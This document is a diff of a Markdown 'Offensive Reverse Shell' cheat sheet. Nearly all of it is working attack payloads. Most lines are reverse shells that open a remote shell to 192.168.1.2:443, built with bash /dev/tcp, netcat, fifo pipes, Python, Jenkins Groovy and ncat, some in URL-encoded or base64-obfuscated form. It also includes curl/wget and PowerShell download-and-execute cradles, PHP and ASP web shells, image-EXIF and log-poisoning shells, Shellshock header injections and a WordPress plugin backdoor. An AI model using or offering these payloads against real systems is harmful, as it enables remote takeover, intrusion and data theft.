@@ -1,25 +1,19 @@
 # `Offensive Reverse Shell (Cheat Sheet)`
 
 - [<kbd>Bash</kbd>](#bash)
-  * [<kbd>Bash (URL Encode)</kbd>](#bash-url-encode)
 - [<kbd>Netcat</kbd>](#netcat)
   * [<kbd>Netcat Linux</kbd>](#netcat-linux)
-      * [<kbd>NO Flags -c -e</kbd>](#no-flags--c--e)
-      * [<kbd>-e</kbd>](#-e)
-      * [<kbd>-e (URL Encode)</kbd>](#-e-url-encode)
-      * [<kbd>-c</kbd>](#-c)
-      * [<kbd>-c (URL Encode)</kbd>](#-c-url-encode)
-      * [<kbd>fifo</kbd>](#fifo)
-      * [<kbd>fifo (URL Encode)</kbd>](#fifo-url-encode)
-      * [<kbd>fifo (Base64)</kbd>](#fifo-url-encode)
   * [<kbd>Netcat Windows</kbd>](#netcat-windows)
 - [<kbd>cURL</kbd>](#curl)
 - [<kbd>Wget</kbd>](#wget)
 - [<kbd>Node-RED</kbd>](#node-red)
-- [<kbd>WebShell</kbd>](#webshell)
-  * [<kbd>Exif Data</kbd>](#exif-data)
+- [<kbd>WebShells</kbd>](#webshells)
+  * [<kbd>Exif Data</kbd>](#exif-data-webshell)
   * [<kbd>ASP WebShell</kbd>](#asp-webshell)
   * [<kbd>PHP WebShell</kbd>](#php-webShell)
+      * [<kbd>Chain Filter</kbd>](#chain-filter)
+      * [<kbd>GET</kbd>](#get)
+      * [<kbd>POST</kbd>](#post)
   * [<kbd>Log Poisoning WebShell</kbd>](#log-poisoning-webshell)
       * [<kbd>SSH</kbd>](#log-poisoning-ssh)
       * [<kbd>FTP</kbd>](#log-poisoning-ftp)
@@ -70,42 +64,64 @@
 
 # <kbd>Bash</kbd>
 
-# <kbd>TCP</kbd>
+<kbd>TCP</kbd>
 
-```cmd
+<kbd>-i</kbd>
+
+```sh
+#sh
+sh -i >& /dev/tcp/192.168.1.2/443 0>&1
+/bin/sh -i >& /dev/tcp/192.168.1.2/443 0>&1
+#bash
 bash -i >& /dev/tcp/192.168.1.2/443 0>&1
-```
- 
-```cmd
-bash -l > /dev/tcp/192.168.1.2/443 0<&1 2>&1
+/bin/bash -i >& /dev/tcp/192.168.1.2/443 0>&1
 ```
 
-```cmd
-sh -i 5<> /dev/tcp/192.168.1.2/443 0<&5 1>&5 2>&5
-```
+# <kbd>196</kbd>
 
-```cmd
-bash -c "bash -i >& /dev/tcp/192.168.1.2/443 0>&1"
-```
-
-```cmd
+```sh
+#sh
 0<&196;exec 196<>/dev/tcp/192.168.1.2/443; sh <&196 >&196 2>&196
+0<&196;exec 196<>/dev/tcp/192.168.1.2/443; /bin/sh <&196 >&196 2>&196
+#bash
+0<&196;exec 196<>/dev/tcp/192.168.1.2/443; bash <&196 >&196 2>&196
+0<&196;exec 196<>/dev/tcp/192.168.1.2/443; /bin/bash <&196 >&196 2>&196
 ```
- 
-```cmd
+
+# <kbd>read line</kbd>
+
+```sh
 exec 5<>/dev/tcp/192.168.1.2/443;cat <&5 | while read line; do $line 2>&5 >&5; done
 ```
 
-# <kbd>UDP</kbd>
+# <kbd>5</kbd>
 
-```cmd
-sh -i >& /dev/udp/192.168.1.2/443 0>&1
+```sh
+#sh
+sh -i 5<> /dev/tcp/192.168.1.2/443 0<&5 1>&5 2>&5
+/bin/sh -i 5<> /dev/tcp/192.168.1.2/443 0<&5 1>&5 2>&5
+#bash
+bash -i 5<> /dev/tcp/192.168.1.2/443 0<&5 1>&5 2>&5
+/bin/bash -i 5<> /dev/tcp/192.168.1.2/443 0<&5 1>&5 2>&5
 ```
 
-# <kbd>Bash URL Encode</kbd>
+# <kbd>-c</kbd>
 
-```cmd
-bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.2%2F443%200%3E%261%22
+```sh
+bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'
+#url encode
+bash -c 'bash -i >%26 /dev/tcp/192.168.1.2/443 0>%261'
+bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.2%2F443%200%3E%261%27
+```
+<kbd>UDP</kbd>
+
+```sh
+#sh
+sh -i >& /dev/udp/192.168.1.2/443 0>&1
+/bin/sh -i >& /dev/udp/192.168.1.2/443 0>&1
+#bash
+bash -i >& /dev/udp/192.168.1.2/443 0>&1
+/bin/bash -i >& /dev/udp/192.168.1.2/443 0>&1
 ```
 
 ---
@@ -114,80 +130,57 @@ bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.2%2F443%200%3E%261%
 
 # <kbd>Netcat Linux</kbd>
 
-# <kbd>No Flags -c -e</kbd>
-
->Credits: UnD3sc0n0c1d0
+<kbd>-e</kbd>
 
 ```sh
-mknod /tmp/backpipe p                                          # 1) create FIFO pipe (pipeline)
-/bin/sh 0</tmp/backpipe | nc 192.168.1.2 443 1>/tmp/backpipe   # 2) reverse shell
+#sh
+nc 192.168.1.2 443 -e sh
+nc 192.168.1.2 443 -e /bin/sh
+#bash
+nc 192.168.1.2 443 -e bash
+nc 192.168.1.2 443 -e /bin/bash
 ```
 
-# <kbd>-e</kbd>
+<kbd>-c</kbd>
 
-```cmd
-nc -e /bin/sh 192.168.1.2 443
-```
-
-```cmd
-nc -e /bin/bash 192.168.1.2 443
-```
-
-# <kbd>-e URL Encode</kbd>
-
-```cmd
-nc%20-e%20%2Fbin%2Fsh%20192.168.1.2%20443
-```
-
-```cmd
-nc%20-e%20%2Fbin%2Fbash%20192.168.1.2%20443
-```
-
-# <kbd>-c</kbd>
-
-```cmd
+```sh
+#sh
+nc -c sh 192.168.1.2 443
 nc -c /bin/sh 192.168.1.2 443
-```
- 
-```cmd
+#bash
+nc -c bash 192.168.1.2 443
 nc -c /bin/bash 192.168.1.2 443
 ```
 
-# <kbd>-c URL Encode</kbd>
+<kbd>NO -e -c</kbd>
 
-```cmd
-nc%20-c%20%2Fbin%2Fsh%20192.168.1.2%20443
+```sh
+#1) create FIFO pipe (pipeline)
+mknod /tmp/backpipe p
+#2) reverse shell
+/bin/sh 0</tmp/backpipe | nc 192.168.1.2 443 1>/tmp/backpipe
 ```
 
-```cmd
-nc%20-c%20%2Fbin%2Fbash%20192.168.1.2%20443
-```
+<kbd>fifo</kbd>
 
-# <kbd>fifo</kbd>
-
-```cmd
+```sh
+#sh
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.1.2 443 >/tmp/f
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.2 443 >/tmp/f
-```
-
-# <kbd>fifo URL Encode</kbd>
-
-```cmd
+#bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.1.2 443 >/tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.1.2 443 >/tmp/f
+#url encode
 rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.1.2%20443%20%3E%2Ftmp%2Ff
-```
 
-# <kbd>fifo Base64</kbd>
-
-```cmd
-root@kali:~# base64 -w 0 <<< 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.2 443 >/tmp/f'
+#base64
+#atacker
+base64 -w 0 <<< 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.2 443 >/tmp/f'
 cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC4xLjIgNDQzID4vdG1wL2YK
-root@kali:~# nc -lvnp 443
-```
-
-```cmd
-user@victim:$ echo 'cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC4xLjIgNDQzID4vdG1wL2YK' |base64 -d |sh
-```
-
-```cmd
+nc -lvnp 443
+#victim
+echo 'cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC4xLjIgNDQzID4vdG1wL2YK' |base64 -d |sh
+#or
 http://192.168.1.3/cmd.php?cmd=echo 'cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC4xLjIgNDQzID4vdG1wL2YK' |base64 -d |sh
 ```
 
@@ -195,11 +188,10 @@ http://192.168.1.3/cmd.php?cmd=echo 'cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXA
 
 # <kbd>Netcat Windows</kbd>
 
-```cmd
+```sh
 nc.exe -e cmd 192.168.1.2 443
-```
-
-```cmd
+#smbserver
+cp $(locate nc.exe) . && impacket-smbserver a $(pwd) -smb2support
 \\192.168.1.2\a\nc.exe -e cmd 192.168.1.2 443
 ```
 
@@ -207,12 +199,11 @@ nc.exe -e cmd 192.168.1.2 443
 
 # <kbd>cURL</kbd>
 
-```cmd
-root@kali:~# echo "nc -e /bin/sh 192.168.1.2 443" > index.html; python3 -m http.server 80
-root@kali:~# nc -lvnp 443
-```
-
-```cmd
+```sh
+#atacker
+echo "nc -e /bin/sh 192.168.1.2 443" > index.html && python3 -m http.server 80
+nc -lvnp 443
+#victim
 http://192.168.1.3/cmd.php?cmd=curl 192.168.1.2/index.html|sh
 ```
 
@@ -220,12 +211,11 @@ http://192.168.1.3/cmd.php?cmd=curl 192.168.1.2/index.html|sh
 
 # <kbd>Wget</kbd>
 
-```cmd
-root@kali:~# echo "nc -e /bin/sh 192.168.1.2 443" > index.html; python3 -m http.server 80
-root@kali:~# nc -lvnp 443
-```
-
-```cmd
+```csh
+#atacker
+echo "nc -e /bin/sh 192.168.1.2 443" > index.html && python3 -m http.server 80
+nc -lvnp 443
+#victim
 http://192.168.1.3/cmd.php?cmd=wget -qO- 192.168.1.2/index.html|sh
 ```
 
@@ -239,13 +229,13 @@ http://192.168.1.3/cmd.php?cmd=wget -qO- 192.168.1.2/index.html|sh
 
 ---
 
-# <kbd>WebShell</kbd>
+# <kbd>WebShells</kbd>
 
-# <kbd>Exif Data</kbd>
+# <kbd>Exif Data WebShell</kbd>
 
-```cmd
-root@kali:~# exiftool -Comment='<?php system($_GET['cmd']); ?>' filename.png
-root@kali:~# mv filename.png filename.php.png
+```sh
+exiftool -Comment='<?php system($_GET['cmd']); ?>' filename.png
+mv filename.png filename.php.png
 ```
 
 # <kbd>ASP WebShell</kbd>
@@ -256,7 +246,7 @@ root@kali:~# mv filename.png filename.php.png
 
 # <kbd>PHP WebShell</kbd>
 
-# <kbd>GET (Filter Chain)</kbd>
+# <kbd>Chain Filter</kbd>
 
 ```php
 php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
@@ -266,43 +256,11 @@ php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.
 
 ```php
 <?=`$_GET[cmd]`?>
-```
-
-```php
 <?php system($_GET['cmd']); ?>
-```
-
-```php
-<?php system($_REQUEST['cmd']); ?>
-```
-
-```php
 <?php passthru($_GET['cmd']); ?>
-```
-
-```php
 <?php echo exec($_GET['cmd']); ?>
-```
-
-```php
+<?php system($_REQUEST['cmd']); ?>
 <?php echo shell_exec($_GET['cmd']); ?>
-```
-
-# <kbd>Basic Proportions OK</kbd>
-
-```php
-<?php
-  if(isset($_REQUEST['cmd'])){
-        echo "<pre>";
-        $cmd = ($_REQUEST['cmd']);
-        system($cmd);
-        echo "</pre>";
-        die;
-  }
-  ?>
-```
-
-```php
 <?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; ?>
 ```
 
@@ -321,7 +279,7 @@ php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.
 > /var/log/auth.log
 
 ```php
-ssh '<?php system($_GET['cmd']); ?>'@192.168.1.2
+ssh '<?php system($_GET["cmd"]); ?>'@192.168.1.2
 ```
 
 > /var/log/auth.log&cmd=id
@@ -409,21 +367,22 @@ root@kali:~# mv filename.png filename.php.png
 
 # <kbd>Shellshock SSH</kbd>
 
-```cmd
-root@kali:~# ssh user@192.168.1.3 -i id_rsa '() { :;}; nc 192.168.1.2 443 -e /bin/bash'
+```sh
+ssh user@192.168.1.3 '() { :;}; nc 192.168.1.2 443 -e /bin/bash'
+ssh user@192.168.1.3 -i id_rsa '() { :;}; nc 192.168.1.2 443 -e /bin/bash'
 ```
 
 ---
 
 # <kbd>Shellshock HTTP</kbd>
 
-```cmd
+```sh
 curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/192.168.1.2/443 0>&1' http://192.168.1.3/cgi-bin/test.sh
 ```
-```cmd
+```sh
 curl -H "User-Agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'" "http://192.168.1.3/cgi-bin/evil.sh"
 ```
-```cmd
+```sh
 curl -H "User-Agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'" "http://192.168.1.3/cgi-bin/evil.cgi"
 ```
 
@@ -431,7 +390,7 @@ curl -H "User-Agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/44
 
 # <kbd>Shellshock HTTP 500 Internal Server Error</kbd>
 
-```cmd
+```sh
 curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'" "http://192.168.1.3/cgi-bin/evil.sh"
 curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'" "http://192.168.1.3/cgi-bin/evil.sh"
 curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'" "http://192.168.1.3/cgi-bin/evil.cgi"
@@ -444,11 +403,14 @@ curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/19
 
 # <kbd>WordPress</kbd>
 
-# <kbd>Plugin Reverse Shell</kbd>
+<kbd>Create Plugin (Reverse Shell)</kbd>
 
 ```cmd
-root@kali:~# nano plugin.php
+touch plugin.php
+nano plugin.php
 ```
+
+<kbd>Content</kbd>
 
 ```php
 <?php
@@ -465,9 +427,13 @@ root@kali:~# nano plugin.php
   ?>
 ```
 
-```cmd
-root@kali:~# zip plugin.zip plugin.php
+<kbd>Compress</kbd>
+
+```sh
+zip plugin.zip plugin.php
 ```
+
+<kbd>Steps</kbd>
 
 * Plugins
 
@@ -478,6 +444,8 @@ root@kali:~# zip plugin.zip plugin.php
 * Install Now
 
 * Activate Plugin
+
+---
 
 # <kbd>October</kbd>
 
@@ -493,20 +461,20 @@ function onstart(){
 
 # <kbd>Jenkins Windows</kbd>
 
-# <kbd>Netcat (Method 1)</kbd>
+<kbd>Netcat (Method 1)</kbd>
 
 ```cmd
 cmd = "\\\\192.168.1.2\\a\\nc.exe -e cmd 192.168.1.2 443"
 cmd.execute().text
 ```
 
-# <kbd>Netcat (Method 2)</kbd>
+<kbd>Netcat (Method 2)</kbd>
 
 ```cmd
 println "\\\\192.168.1.2\\a\\nc.exe -e cmd 192.168.1.2 443" .execute().text
 ```
 
-# <kbd>CMD</kbd>
+<kbd>CMD</kbd>
 
 ```cmd
 String host="192.168.1.2";
@@ -515,7 +483,7 @@ String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
 
-# <kbd>PowerShell</kbd>
+<kbd>PowerShell</kbd>
 
 ```cmd
 command = "powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.2:8000/reverse.ps1')"
@@ -524,7 +492,19 @@ println(command.execute().text)
 
 # <kbd>Jenkins Linux</kbd>
 
-# <kbd>Bash</kbd>
+<kbd>Netcat (Method 1)</kbd>
+
+```cmd
+cmd = "nc -e /bin/sh 192.168.1.10 443"
+cmd.execute().text
+```
+<kbd>Netcat (Method 2)</kbd>
+
+```cmd
+"nc -e /bin/sh 192.168.1.2 443".execute().text
+```
+
+<kbd>Bash</kbd>
 
 ```cmd
 String host="192.168.1.2";
@@ -545,29 +525,76 @@ perl -e 'use Socket;$i="192.168.1.2";$p=443;socket(S,PF_INET,SOCK_STREAM,getprot
 
 # <kbd>Python</kbd>
 
+<kbd>Sh</kbd>
+
+```cmd
+export RHOST="192.168.1.2";export RPORT=443;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
+```
+
 ```cmd
 export RHOST="192.168.1.2";export RPORT=443;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+```
+
+```cmd
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.2",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+```
+
+```cmd
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.2",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
+```
+
+<kbd>Bash</kbd>
+
+```cmd
+export RHOST="192.168.1.2";export RPORT=443;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
+```
+
+```cmd
+export RHOST="192.168.1.2";export RPORT=443;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
+```
+
+```cmd
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.2",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
 ```
 
 ```cmd
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.2",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
 ```
 
+---
+
 # <kbd>Python3</kbd>
 
+<kbd>Sh</kbd>
+
 ```cmd
-#!/usr/bin/python3
+export RHOST="192.168.1.2";export RPORT=443;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
+```
 
-import os
-import socket
-import subprocess
+```cmd
+export RHOST="192.168.1.2";export RPORT=443;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+```
 
-s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("192.168.1.2",443))
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2)
-p=subprocess.call(["/bin/sh","-i"])
+```cmd
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.2",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+```
+
+```cmd
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.2",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
+```
+
+<kbd>Bash</kbd>
+
+```cmd
+export RHOST="192.168.1.2";export RPORT=443;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
+```
+
+```cmd
+export RHOST="192.168.1.2";export RPORT=443;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
+```
+
+```cmd
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.2",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
 ```
 
 ```cmd
@@ -618,14 +645,14 @@ xterm -display 192.168.1.2:443
 
 # <kbd>Ncat</kbd>
 
-# <kbd>TCP</kbd>
+<kbd>TCP</kbd>
 
 ```cmd
 ncat 192.168.1.2 443 -e /bin/sh
 ncat 192.168.1.2 443 -e /bin/bash
 ```
 
-# <kbd>UDP</kbd>
+<kbd>UDP</kbd>
 
 ```cmd
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u 192.168.1.2 443 >/tmp/f
